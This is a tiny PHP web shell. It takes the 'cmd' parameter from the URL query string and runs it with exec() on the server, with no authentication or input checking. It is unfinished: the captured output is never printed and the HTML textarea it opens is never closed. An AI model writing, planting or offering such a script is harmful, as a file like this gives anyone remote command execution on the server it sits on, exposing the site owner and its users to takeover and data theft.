<?php
$cmd = $_GET['cmd'];
echo("<b>Results:</b>\n<br><textarea rows=20 cols=100>");
$cmd = exec($cmd, $result);  
exit;
?>